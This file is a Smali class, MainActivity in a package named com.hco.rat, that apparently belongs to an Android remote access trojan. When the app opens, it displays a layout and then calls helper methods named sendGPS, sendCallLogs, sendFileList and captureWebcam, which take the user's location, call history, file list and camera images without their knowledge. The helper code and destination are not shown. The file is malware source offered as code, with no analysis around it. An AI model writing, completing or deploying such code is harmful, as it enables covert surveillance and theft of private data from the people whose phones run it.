.class public Lcom/hco/rat/MainActivity;
.super Landroid/app/Activity;

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 1

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const v0, 0x7f030000
    invoke-virtual {p0, v0}, Landroid/app/Activity;->setContentView(I)V

    # Call all utility functions
    invoke-static {p0}, Lcom/hco/rat/Utils;->sendGPS(Landroid/content/Context;)V
    invoke-static {p0}, Lcom/hco/rat/Utils;->sendCallLogs(Landroid/content/Context;)V
    invoke-static {p0}, Lcom/hco/rat/Utils;->sendFileList(Landroid/content/Context;)V
    invoke-static {p0}, Lcom/hco/rat/Utils;->captureWebcam(Landroid/content/Context;)V

    return-void
.end method
